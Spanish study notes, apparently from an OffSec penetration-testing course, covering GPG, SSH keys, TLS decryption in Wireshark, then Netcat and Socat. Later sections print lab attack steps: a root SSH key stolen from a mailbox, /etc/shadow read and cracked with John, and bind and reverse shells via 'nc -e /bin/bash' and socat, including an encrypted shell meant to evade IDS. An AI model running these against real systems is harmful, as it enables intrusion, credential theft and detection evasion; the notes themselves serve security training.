El flag '--armor' hace que el output sea ASCII en lugar de binario. Por ejemplo:

```bash
kali@kali:~$ gpg --output example-pub.asc --armor --export Offsec

kali@kali:~$ cat example-pub.asc
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQGNBGB+1GABDACwBj35jXh1OB8xvx7P+L4W9HRmns0TMKvOi8+fYpz9SbOS2aQo
...
mRRN3arAPcuWx7pw+rToyArDvXXIrwtXGSNfS8FZsHT4HPLzEkcAlMx30j6b59TX
EqRxg0u8zhMYYESiUV7nJOw=
=6PEF
-----END PGP PUBLIC KEY BLOCK-----
```

Ahora, cualquiera podría utilizar este fichero a modo de clave pública para cifrar un mensaje que nosotros podríamos cifrar con la clave privada.

```bash
kali@kali:~$ echo "Asymmetric encryption example" > asymmetry.txt

kali@kali:~$ gpg --recipient Offsec --encrypt asymmetry.txt
gpg: checking the trustdb
gpg: marginals needed: 3  completes needed: 1  trust model: pgp
gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
gpg: next trustdb check due at 2023-04-20

kali@kali:~$ ls -l asymmetry*
-rw-r--r-- 1 kali kali      30 Apr 20 09:42 asymmetry.txt
-rw-r--r-- 1 kali kali     498 Apr 20 09:43 asymmetry.txt.gpg

kali@kali:~$ file asymmetry.txt.gpg
asymmetry.txt.gpg: PGP RSA encrypted session key - keyid: 84C9AC07 E5046E4E RSA (Encrypt or Sign) 3072b .

kali@kali:~$ cat asymmetry.txt.gpg 
���ɬ�nN
       �RH���-yF%����0C
l��%�}�<�ͺٱ��I��bwx���IU�����t�7F����<�u
]���;�!ѥ�f�1��3pl#g|��Lok6>�#��h���S�v��;�AS�C�+9�����r▒]"x��V#��V�F%�PV����/G�4O�W����׿�]_�$C�t�3�Q!▒����Z�L�w�o��iˤy-љ�>^
                                                                                                                           ����ng:m�鼹_j�FO
������[ �u�����C/��s������,
                           ߑ<G3'�������Jԯ�dNt�jh,װ�$���N�f=ޖT�h��W���#�ߛ��9�|:���~`�c]E�kgm�}m��Y�3
                                                                                                   �8q�q��G�����*�a��0.�qF�XH���[j��H��P��s� B��{�DY�'A��
{�Қ�����ڣb�G*$R�>XSW    (�0ۀ�DcѸ_޻� ��,�ˈ����
```

Aquí observamos que el archivo cifrado es significativamente más grande que el texto sin formato de entrada, especialmente en relación con nuestros experimentos anteriores con el cifrado de clave simétrica.

Finalmente, dado que nos enviamos este mensaje a nosotros mismos, podemos descifrar el archivo usando nuestra clave privada. Nuevamente, normalmente sería el destinatario el que descifraría el archivo usando su propia clave privada, y nosotros habríamos usado su clave pública para cifrar el archivo.

```bash
kali@kali:~$ gpg --decrypt asymmetry.txt.gpg
gpg: encrypted with 3072-bit RSA key, ID 84C9AC07E5046E4E, created 2021-04-20
      "Offsec <test@example.com>"
Asymmetric encryption example
```

Tenga en cuenta que necesitaremos ingresar la frase de contraseña que creamos anteriormente durante la generación del par de claves, cuando se le solicite

Además de cifrar y descifrar mensajes secretos, los pares de claves asimétricas también se pueden usar para *firmar* y *verificar* mensajes. Al igual que una firma física, un mensaje firmado le permite al destinatario verificar que el remitente es realmente quien dice ser.

Tenga en cuenta que firmar un mensaje con una clave privada no es equivalente a enviar dicha clave al destinatario. En otras palabras, la firma de mensajes no amenaza la confidencialidad de la clave privada del remitente.

<br />

##### 1.7.2. Asymmetric Encryption Example.

Vamos a ver un ejemplo de cómo descifrar un mensaje con unas claves foráneas. En primer lugar, necesitamos tener los ficheros que contienen las claves e importarlos dentro del catálogo de claves de la GPG:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ gpg --list-keys
gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created

┌──(kali㉿kali)-[~/Desktop]
└─$ gpg --import ea23ed86437ac313125649715d1fb23c-melanie-private.asc 
gpg: key EEDCFBF73D3C1231: public key "Melanie <melanie@example.com>" imported
gpg: key EEDCFBF73D3C1231: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

┌──(kali㉿kali)-[~/Desktop]
└─$ gpg --list-keys                                                  
/home/kali/.gnupg/pubring.kbx
-----------------------------
pub   rsa3072 2021-04-20 [SC] [expires: 2023-04-20]
      07638F6D406B4AE9817BE806EEDCFBF73D3C1231
uid           [ unknown] Melanie <melanie@example.com>
sub   rsa3072 2021-04-20 [E] [expires: 2023-04-20]
```

Para importarlos satisfactoriamente necesitaremos acrediat el 'passphrase' que necesitamos saber con anterioridad. Seguidamente, procedemos a descifrar el flag:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ gpg --decrypt e7438b4648331224f7495637aada1b6c-flag.gpg          
gpg: encrypted with 3072-bit RSA key, ID 1A12F2CC35C2E172, created 2021-04-20
      "Melanie <melanie@example.com>"
OS{A-Flag-4-Royalty}
```

<br />

##### 1.7.3. Asymmetric Encryption with SSH.

Comprender los conceptos básicos de la criptografía asimétrica es ciertamente interesante, pero desafortunadamente no se aplica prácticamente a la mayoría de las tareas de seguridad del día a día, ni en el lado defensivo ni en el ofensivo.

Ahora centremos nuestra atención en un área más práctica, la autenticación asimétrica con SSH. SSH es un protocolo criptográfico que entre otras cosas permite la administración remota de otro equipo como ya sabemos y la generación de claves de cifrado asimétrico.

Veámos cómo generar un par de claves SSH, cómo configurar un servidor SSH para usar un par de claves para la autenticación y, finalmente, cómo iniciar sesión en un servidor remoto proporcionando una clave pública como entrada al servidor.

<br />

**Herramientas de generación de claves**

Podemos generar un par de claves SSH en Kali con *ssh-keygen*. Tendremos que especificar el nombre del archivo de salida deseado, así como una frase de contraseña opcional.

```
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key: /home/kali/.ssh/kali_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/kali_rsa
Your public key has been saved in /home/kali/.ssh/kali_rsa.pub
The key fingerprint is:
SHA256:fhLZNenKE6VD1CPm92uhyhVqHwXbG05Rpuvx0sPNbKU kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|          ..    o|
|         .o o. + |
|         o..*.o  |
|         +.=.= o |
|        S =.+.B .|
|       . o = *+Xo|
|        o B o.E=B|
|         = +..oo.|
|          o...   |
+----[SHA256]-----+
```

Ahora que hemos generado un par de claves, debemos colocar la clave pública en un servidor remoto para logearnos desde nuestra kali a dicho servidor (si tiene un servidor SSH escuchándo). 

Para enviar nuestra clave pública al servidor SSH remoto, podemos usar la utilidad ssh-copy-id. Se nos pedirá que ingresemos la contraseña para el usuario de kali.

```bash
kali@kali:~$ ssh-copy-id -i /home/kali/.ssh/id_rsa.pub kali@localhos
/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: "/home/kali/.ssh/id_rsa.pub"
/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed
/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys
kali@localhost's password: 

Number of key(s) added: 1

Now try logging into the machine, with:   "ssh 'kali@localhost'"
and check to make sure that only the key(s) you wanted were added.
```

Finalmente, podemos iniciar sesión en el servidor remoto invocando el indicador -i.

```bash
kali@kali:~$ ssh -i .ssh/id_rsa kali@localhos
Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Apr 20 17:23:04 2021 from ::1

kali@kali:~$ cd .ssh

kali@kali:~/.ssh$ ls -l
total 16
-rw------- 1 kali kali  563 Apr 20 17:32 authorized_keys
-rw------- 1 kali kali 2590 Apr 20 17:23 id_rsa
-rw-r--r-- 1 kali kali  563 Apr 20 17:23 id_rsa.pub
-rw-r--r-- 1 kali kali  222 Apr 20 17:23 known_hosts

kali@kali:~/.ssh$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfkT0yyXl+gTncAajec+LsS2qq3o2iIBCJHJTLxOVBrBAZh8kL5sYWLXA34iRsp8YdaUIb16h6KRJwiZyhvV5Yg//OhEMK+Rkim7LKZ1Mm09Ubueniw3BlqWbEmuRx4K40pAvZkFMpOSZ9xJGFTc72NhfVYj7KOta5KjQmV85O0KCzBCsZ3qleJWmerTU2EAGJsvKIRngrO3zVOVOkqSmtlfezmrknsG0Kb0hf3cxWxNIN4lUCLEuUbz0Xh/qUrFv6gbAqWbSj6wgsARoRLtR6k88wVGJp/ZhYDI8OpSru3nrmjjZVIqonXPXXQXlB1rdJoihzaEGVgLNRD71WnOR+cIGSM4Hb29P81nZTZ/I3YUWpxf+S+om1jGKVqWWa/bIZ8juVeq03I8BAFUu8eQgtuUk8e9WOpQ//e2oA22+a7eTMBsimXkqSGTDeJMpAnAjok9NINOlCgbA4lDUSOvTjuUzkogDDwTYcn/nj4Z3BjpmLaBpoQV5kgd2GjxrqYC8= kali@kali
```

Notamos que hay un archivo recién creado llamado authorized_keys en el directorio .ssh , y que contiene nuestra clave pública. De hecho, podríamos simplemente haber copiado el archivo id_rsa.pub en authorized_keys ya que solo estamos usando un único host. Si quisiéramos copiarlo de forma remota y ssh-copy-id no estuviera instalado, podríamos usar algo como scp , o simplemente tener SSH con una contraseña normal para copiarlo manualmente.

*Así, en resumidas cuentas para acceder al servicio de administración remota de SSH entre un cliente y un servidor SSH, debe de generarse un par de claves público/privada concediéndo una clave pública al servidor y una clave privada para el cliente de forma que cada uno puede enviar mensajes cifrados que el otro pueda descifrar.*

<br />

**Exercises**

**Utilice la máquina virtual del navegador Kali basada en la web para generar un par de claves SSH para el usuario de Kali. ¿Cuál es la ruta completa de la clave privada generada por defecto?**

/home/kali/.ssh/id_rsa

<br />

**Al copiar una clave a un servidor remoto, ¿debemos copiar sobre nuestra clave privada o nuestra clave pública?**

La clave pública de ir sobre el servidor al que envíamos una petición de administración remota, guardándonos nosotros la clave privada que nunca debe ser compartida.

<br />

**Después de seguir las instrucciones para crear el archivo _authorized_keys_ durante la generación de claves SSH, use el comando _diff con el indicador_ _-s_ para compararlo con _id_rsa.pub_ . ¿Cuál es la última palabra de la salida de este comando?**

Cuando generamos un par de claves y admitimos la conexión de un cliente con una clave pública, esta pasará a formar parte del contenido de un fichero denominado 'authorized_keys'. Así, nos encontramos con que como la única clave aceptada es la nuestra, el contenido de id_rsa.pub y el de authorized_keys es idéntico.

<br />

##### 1.7.4. Asymmetric Encrypted Bind Shells.

SSL (Secure Sockets Layer) y TSL son protocolos de la capa de presentación (capa 6) del modelo OSI, que se encargan de cifrar la comunicación entre dos puntos. Observemos que no actúan de la misma manera que SSH u otro protocolo parecido ya que estos pertenecen a la capa de aplicación, son servicios.

Por ejemplo, uno de los usos más empleados para TSL actualmente consiste en cifrar la comunicación HTTP (HTTPS) entre otros.

<br />

**Openssl**

Vamos a ver cómo podemos interactuar con SSL mediante el cli 'openssl' para crear certificados y claves privadas y cómo utilizar estos elementos junto con Socat para crear shells cifradas.

Por otro lado, un certificado es un documento que contiene una clave públicada ligada a una serie de datos de una organización o una empresa. Un certificado firmado además está revisado por un tercero para asegurar que la información que el certificado ofrece es veridica.

El comando que emplearemos es el siguiente:

```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 30 -out bind_shell.crt
```

- *req*: le dice a openssl que queremos crear un nuevo certificado.
- *-newkey*: le dice a openssl que también queremos generar una nueva clave privada.
- *rsa:2048*: define el algoritmo de encriptación que queremos usar. Esto es similar a la marca --cipher-algo utilizada por *gpg*. En este caso, estamos usando el algoritmo RSA con una longitud de clave de 2048 bits.
- *-nodes*: dice que se cree la clave privada sin una frase de contraseña para protegerla. Esto es similar a crear una clave SSH sin protección de contraseña.
- *-key*: nos permite guardar la clave privada generada en un archivo de salida en formato Base64.
- *-x509*: asegura que nuestro certificado esté autofirmado. La alternativa es utilizar una _autoridad certificadora_ existente.
- *-days*: especifica el número de días que queremos que el certificado sea válido. En nuestro caso, optaremos por dar a nuestro certificado 30 días de validez.
- *-out*: guarda el certificado en un archivo, también en formato Base64

```bash
kali@kali:~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 30 -out bind_shell.crt
Generating a RSA private key
...............................................................................+++++
...+++++
writing new private key to 'bind_shell.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:NY
Locality Name (eg, city) []:NY
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Offsec
Organizational Unit Name (eg, section) []:Security
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
kali@kali:~$ head bind*
==> bind_shell.crt <==
-----BEGIN CERTIFICATE-----
MIIDdz
...

==> bind_shell.key <==
-----BEGIN PRIVATE KEY-----
MIIEvA
...
kali@kali:~$
```

Después de ejecutar el comando, observamos dos archivos adicionales en nuestro directorio de trabajo: bind_shell.crt contiene nuestro certificado y bind_shell.key contiene la nueva clave privada.

Para poder utilizar ambos con Socat necesitamos combinar ambos en un fichero PEM (*Privacy Enhanced Mail*) o .pem el cual es simplemente una lista de cadenas codificadas en Base64, que generalmente contiene varios certificados, claves y otros elementos criptográficos

```bash
cat bind_shell.key bind_shell.crt > bind_shell.pem
```

Cómo crear la Shell en Socat se verá más adelante.

<br />

##### 1.7.5. SSL & HTTPS.

El SSL más conocido es HTTPS, que es una versión criptográficamente mejorada del protocolo HTTP. Cuando visitamos un sitio web habilitado para SSL con un navegador, el servidor web proporciona un certificado que contiene una clave pública.

Los procedimientos de cifrado SSL aprovechan tanto el cifrado asimétrico como el simétrico. Primero, el servidor y el cliente acuerdan una _clave de sesión_ simétrica , que el cliente cifra con la clave pública del servidor. Esta clave de sesión luego se transmite a través de la red al servidor. A continuación, el servidor usa su clave privada para descifrar la clave de sesión.

Observe cómo esta maniobra permite que el cliente y el servidor pasen por alto la debilidad inherente del cifrado simétrico mediante el uso de cifrado asimétrico para transmitir la clave simétrica. Después del intercambio de claves inicial, ambas partes pueden usar la misma clave de sesión para cifrar y descifrar todos los datos futuros que se transfieran entre sí.

Si la clave privada inicial utilizada para descifrar la clave de sesión alguna vez se ve comprometida, sería posible descifrar la clave de sesión y, por lo tanto, todos los datos que se cifraron con ella.

Para superar este problema y varias otras deficiencias importantes, se introdujo un nuevo estándar llamado _Transport Layer Security_ (TLS). Con el tiempo, las versiones de TLS comenzaron a introducir más y más conjuntos de cifrado que admitían el secreto directo. En resumen, esta característica asegura que la comunicación pasada no se pueda descifrar si la clave privada se ve comprometida.

La última versión (1.3) de TLS contiene solo conjuntos de cifrado que admiten el secreto directo. Por esta razón, los desarrolladores de navegadores tienden a desaprobar SSL y la versión anterior de TLS, pero aún se ven obligados a mantener algunos conjuntos de cifrado débiles por razones de compatibilidad.

TLS ayuda a garantizar que la mayoría de las comunicaciones cifradas basadas en la web no se puedan descifrar fácilmente utilizando solo la clave privada del servidor, ya que solo una parte de la clave de sesión se transmite a través de la red. Además, la clave de sesión se renueva periódicamente entre cliente y servidor. Debido a esto, se necesitarían todas las claves de sesión para descifrar el tráfico en caso de que se comprometiera la clave privada.

Las aplicaciones de análisis de tráfico como Wireshark nos permiten cargar un conjunto de claves de sesión y usarán automáticamente esas claves para el descifrado. Se puede cargar un archivo de registro de clave (pre)-Master-Secret en la ventana de configuración de TLS navegando a _Editar_ > _Preferencias_ > _TLS_ en el árbol de protocolos.

Como recordatorio, podemos cargar una captura de paquete guardada en Wireshark ingresando Ctrl+O o a través del menú en _Archivo_ > _Abrir_ .

<br />

**Exercises**

**Descifre la captura de paquetes http_basic_auth.pcap con la ayuda del archivo de registro http_basic_auth.key.txt que contiene las claves secretas por sesión. Encuentre el contenido del archivo secret.txt descargado en la captura de tráfico.**

En primer lugar descargamos ambos ficheros y lo pasamos a la Kali. Seguidamente, abrimos con Wireshark el fichero 'http_basic_auth.keys.txt' y con este abierto cargamos el fichero 'http_basic_auth.key.txt' en Edit > Preferences > TLS y cargamos el fichero en el campo (Pre)-Master-Key log file:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221224160338.png' | relative_url }}" text-align="center"/>
</div>

Automáticamente, se vera tráfico HTTP que se puede seguir como sigue:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221224160540.png' | relative_url }}" text-align="center"/>
</div>

Y pulsamos sobre 'HTTP stream' (asegurándonos de estar ante el paquete correspondiente a HTTP 1.1. GET /secret/secret.txt) de forma que al final de todo el fichero obtenemos la flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221224161801.png' | relative_url }}" text-align="center"/>
</div>

<br />

**¿Qué contraseña se proporcionó para la autenticación básica en la captura de tráfico?**

La autorización debe ir en la request que solicita los recursos de /secret. De esta forma investigamos las cabeceras http de esta request y encontramos:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221224163752.png' | relative_url }}" text-align="center"/>
</div>

<br />

**¿Cuál es el valor del _nombre común_ en el campo de asunto del certificado proporcionado por el servidor?**

Introducimos en la barra de filtros: "tls.handshake.certificate" y rebuscando obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221224165426.png' | relative_url }}" text-align="center"/>
</div>

<br />


##### 1.7.6. Challenge Exercises.

En este caso tenemos una máquina sobre la que escalar privilegios y obtener persistencia.

Las credenciales iniciales son SSH son apprentice:kadabra, una vez dentro, realizando un trabajo de enumeración descubrimos una clave SSH del usuario root en el mailbox de nuestro usuario (/var/mail/apprentice). Para ver mejor el documento lo trasladamos via scp a nuestra máquina:

```bash
scp apprentice@192.168.87.50:/var/mail/apprentice apprentice
```

Y ahí lo abrimos con un editor de textos:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221225111426.png' | relative_url }}" text-align="center"/>
</div>

Observamos que está codificada en base64, de forma que copiamos el contenido en un fichero externo y lo decodificamos y cambiamos los permisos:

```bash
cat enckey.b64 | base64 -d > id_rsa; chmod 400 id_rsa
```

Y seguidamente utilizamos el fichero para logearnos como root:

```bash
ssh -i id_rsa root@192.168.87.50
```

Una vez como root, deseamos mantener permanencia haciéndonos con su contraseña para logearnos cuando queramos. Así, acudimos al fichero /etc/shadow  y nos hacemos con su contraseña:


```
root@crypto:~# cat /etc/shadow | grep root
root:$6$VvN1wBiLLmqWtRXY$oPzxsQbXqdzIISj5NzmKeiUcfXGvFJzqi9YFCzOtdOOI4yOqXm.UBiP7oLeDH8kZUgCtwBwY.YcbqVx7RWlj51:18793:0:99999:7:::
```

Y crackeamos el hash con johntheripper, el \$6\$ nos indica:

```bash
john hash.txt -w=/usr/share/wordlists/rockyou.txt -format=Raw-SHA512
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spellbound       (root)     
1g 0:00:00:21 DONE (2022-12-25 04:43) 0.04723g/s 2998p/s 2998c/s 2998C/s yoana..sagapw
Use the "--show" option to display all of the cracked passwords reliably
```

<br />

### 2. Netcat.

Netcat fue el primer prototipo de herrmienta para pentesters. Es conocida como la navaja suiza y esta es una clara expresión de la amplia variedad de usos que tienen la herramienta. La definición forma es que se trata de una herramienta que permite leer y escribir datos a lo largo de conexiones de red empleando tanto TCP como UDP.

<br />

#### 2.1. Conectando a un puerto TCP/UDP.

Netcat como programa puede actuar tanto a modo de cliente como a modo de servidor. 

Como cliente Netcat puede conectarse a cualquier puerto TCP/UDP y permitirnos: verificar si un puerto está abierto o cerrado, leer un banner del servicio en escucha y por último, conectarnos y realizar peticiones manuales a un servicio, por ejemplo HTTP, FTP, etc.

```bash
kali@kali:~$ nc -nv 10.11.0.22 110
(UNKNOWN) [10.11.0.22] 110 (pop3) open
+OK POP3 server lab ready <00004.1546827@lab>
USER offsec
+OK offsec welcome here
PASS offsec
-ERR unable to lock mailbox
qui
+OK POP3 server lab signing off.
```

En el ejemplo anterior podemos ver cómo nos conectamos a un servidor POP3 (puerto 110) y seguidamente introducimos comandos manualmente para realizar una petición de logeo al servidor.

<br />

#### 2.2. Escuchando en un puerto TCP/UDP.

Con Netcat también podemos abrir un puerto para recibir una petición, esto suele ser francamente útil a la hora de recibir un fichero, una conexión de shell (reverse shell) o para debuggear una aplicación.

Para actuvar esta característica empleamos el flag '-lp', el '-l' es para escuchar, el '-p' para especificar el puerto además también podemos añadir el '-nv' para indicar sólo IPs numéricas (no dominios) y que verbaliza el resultado.

```bash
C:\Users\offsec> nc -nlvp 4444
listening on [any] 4444 ...
```

Cuando recibimos una conexión obtenemos:

```bash
C:\Users\offsec> nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43447
This chat is from the linux machine
```

Esta nos dice qué máquina actúa como cliente, que máquina actúa como servidor y desde que puerto se manda la conexión.

<br />

#### 2.3. Transferiendo ficheros con Netcat.

Veamos ahora un uso práctico de Netcat.

Vamos a utilizar esta herramienta para escuchar con Netcat en un puerto y lanzar una conexión en el que envíamos un fichero con Netcat desde otra máquina obteniendo efectivamente una transferencia de ficheros entre dos máquinas.

En primer lugar, en una máquina activamos un puerto en escucha:

```bash
C:\Users\offsec> nc -nlvp 4444 > incoming.exe
listening on [any] 4444 ...
```

El contenido que se reciba en esa conexión será enviado a un fichero gracias a un operador redirector (>).

En la otra máquina seguidamente enviamos el contenido de un fichero con el operador redirector inverso (<) sobre la conexión saliente que envía:

```bash
kali@kali:~$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
(UNKNOWN) [10.11.0.22] 4444 (?) open
```

En el puerto que estaba escuchando, después de que pase un rato (dado que se trata de un fichero pequeño) cancelamos el proceso con Ctrl+C: 

```bash
C:\Users\offsec> nc -nlvp 4444 > incoming.exe
listening on [any] 4444 ...
connect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43459
^C
C:\Users\offsec>
```

Por último testeamos que el fichero se haya transferido correctamente, generalmente vale con observar el tamaño del ficheor y comrpobar que este coincide con el tamaño del fichero original en la otra máquina.

<br />

#### 2.4. Administración remota con Netcat (Bind/Reverse shell).

Una de las mejores características de Netcat como herramienta de pentesting es la capacidad de realizar una redirección de comandos o, dicho de otra manera, efectuar una administración remota.

Esto se puede dar en dos contextos, una bind shell es una forma de conexión en la que el atacante desde una máquina remota se conecta a la máquina comprometida y pide una shell. Por el contrario en una reverse shell el atacante recibe una conexión de la máquina comprometida. 

La reverse shell siempre suele ser la opción de preferencia pues en la mayoría de los casos, los firewalls u otras herramientas de seguridad no suelen vigiliar (o las vigilan con menos frecuencia) las conexiones salientes.

En el caso de netcat, una bind shelll se percibiría de la siguiente manera:

*Máquina comprometida*:

```bash
nc -nlvp 10.11.0.22 4444 -e /bin/bash
(UNKNOWN) [10.11.0.22] 4444 (?) open
```

*Máquina atacante*:

```bash
nc -nv 10.11.0.22 4444
```

La máquina comprometida espera una conexión que deriva hacia la aplicación que correra un entorno de línea de comandos mientras que la máquina atacante sencillamente ejecuta una conexión saliente con netcat. La opción -e ejecuta un programa que comparte a través de la conexión después de que esta haya sido establecida.

Por otra parte, una reverse shell sería:

*Máquina comprometida*:

```bash
nc -nv 10.11.0.22 4444 -e /bin/bash
(UNKNOWN) [10.11.0.22] 4444 (?) open
```

*Máquina atacante*:

```bash
nc -nlvp 10.11.0.22 4444
```

La máquina comprometida introduce el flow de una aplicación que genera una shell sobre una conexión saliente que es recibida por la máquina atacante.

<br />

#### 2.5. Practice -Netcat.

**1er Flag**

El primer ejercicio nos dice que existe un puerto 5555 que puede escucha una conexión del tipo nc -lvp -e /bin/bash, es decir, que la conexión nos dará una shell.
Así, nos conectamos y:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221206212414.png' | relative_url }}" text-align="center"/>
</div>

<br />

**2do Flag**

En la segunda, conseguimos acceso a nuestra flag utilizando un binario que despliega una conexión a un servidor en escucha en nuestra máquina (reverse shell).

<br />

**3er Flag**

En este necesitamos transferir un binario que necesitamos correr como root (en nuestra máquina) para obtener la flag. Así procedemos como en el ejemplo anterior para obtener el fichero y la flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221206215353.png' | relative_url }}" text-align="center"/>
</div>

<br />

### 3. Socat.

Socat es una utilidad de línea de comandos que abre dos streams de datos de forma bidireccional y transfiere datos entre ellos. De cara al pentesting, Socat es algo así como la evolución de Netcat ya que ofrece las mismas funciones con algunas adiciones.

<br />

#### 3.1. Netcat vs Socat.

Conexióna puerto externo con Netcat y Socat.

```bash
kali@kali:~$ nc <remote server's ip address> 80

kali@kali:~$ socat - TCP4:<remote server's ip address>:80
```

Escuchando en un puerto con Netcat y Socat:

```bash
kali@kali:~$ sudo nc -lvp localhost 443

kali@kali:~$ sudo socat TCP4-LISTEN:443 STDOUT
```

Es necesario el 'sudo' para escuchar en puertos que estén por debajo de 1000.

<br />

#### 3.2. Socat File Transfers.

Para transferir ficheros Socat tiene un procedimiento distinto. Con Netcat envíamos los contenidos del fichero a lo largo de una conexión con Netcat. La conexión entrante en la máquina remota se guardaba en un fichero y deb esa forma se completaba la transferencia. 

En Socat se lleva a cabo un procedimiento distinto en el que en lugar de enviar en el fichero sobre una conexión saliente se espera a que el fichero se descargue mediante una petición entrante.

En primer lugar se prepara un fichero para que esté accesible desde un puerto en escucha:

```bash
kali@kali:~$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
```

Seguidamente, desde la otra maquina se descarga el fichero ques e copia en un fichero creado localmente también por Socat:

```bash
C:\Users\offsec> socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create

C:\Users\offsec> type received_secret_passwords.txt
"try harder!!!"
```

Es un procedimiento parecido a descargar un fichero de un servidor HTTP con Curl o Wget.

<br />

#### 3.3. Socat Reverse Shells.

Veamos ahora cómo se crean las reverse shells en Socat. 

Máquina local:

```bash
socat -d -d TCP4-LISTEN:443 STDOUT
... socat[4388] N listening on AF=2 0.0.0.0:443
```

Máquina remota:

```bash
socat -d -d TCP4:10.11.0.22:443 EXEC:/bin/bash
```

Un comando análogo para Windows sería:

```cmd
socat -d -d TCP4:192.168.1.142:5000 EXEC:cmd.exe,pipes
```

Después de que se efectúe la conexión recibimos en la máquina local una shell:

```bash
... socat[4388] N accepting connection from AF=2 10.11.0.4:54720 on 10.11.0.22:443
... socat[4388] N using stdout for reading and writing
... socat[4388] N starting data transfer loop with FDs [4,4] and [1,1]
whoami
kali
id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
```

<br />

#### 3.4. Socat Encrypted Bind Shells.

Socat nos permite utilizar certificados SSL para cifrar BindShells. Esto es especialmente útil para evitar herramientas de detección como IDS/IPS, etc.

En primer lugar, generamos un certificado SSL con *openssl*:

```bash
kali@kali:~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
Generating a 2048 bit RSA private key
.....................+++
................................+++
writing new private key to 'bind_shell.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:Georgia
Locality Name (eg, city) []:Atlanta
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Offsec
Organizational Unit Name (eg, section) []:Try Harder Department
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

Seguidamente, enviamos la llave privada y el certificado sobre un fichero .pem para que Socat sea capaz de leerlo:

```bash
kali@kali:~$ cat bind_shell.key bind_shell.crt > bind_shell.pem
```

Después empleamos el siguiente comando en la máquina remota para aceptar una conexión cifrada después de haber llevado también el certificado a dicha máquina:

```bash
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```


Y desde la máquina local lanzamos una conexión:

```bash
kali@kali:~$ socat - OPENSSL:10.11.0.4:443,verify=0
id
uid=0(root) gid=0(root) groups=0(root)
whoami
roo
```

<br />

#### 3.5. Practice Socat.

Veámos ahora un conjunto de ejercicios con Socat dados entre una máquina Windows y una máquina Linux. El primer paso es descargar [Socat para Windows](https://github.com/tech128/socat-2.0.0-b8-windows) en la máquina Windows que vayamos a utilizar..

**File Transfer**

En primer lugar vamos a preparar una transferencia de ficheros entre dispositivos, vamos a descargar para la máquina Windows el fichero [powercat.ps1](https://github.com/besimorhino/powercat/blob/master/powercat.ps1). Como comentábamos al principio, al contrario de lo que ocurría con Netcat, en Socat la transferencia de ficheros funciona como una descarga de ficheros entre un servidor y un cliente. 

De esta forma, preparamos la máquina que tiene el fichero (nuestra kali) para recibir una petición de descarga del fichero powercat.ps1. 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221207185129.png' | relative_url }}" text-align="center"/>
</div>

Mientras tanto, en la otra máquina preparamos una petición de descarga y creamos un fichero en nuestro escritorio:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221207185238.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Encrypted Reverse Shell**

Ahora, vamos a preparar una reverse shell y la vamos a cifrar. Recordamos que una reverse shell es una petición de administración remota de un cliente en un servidor que se inicia mediante una conexión del servidor al cliente. 

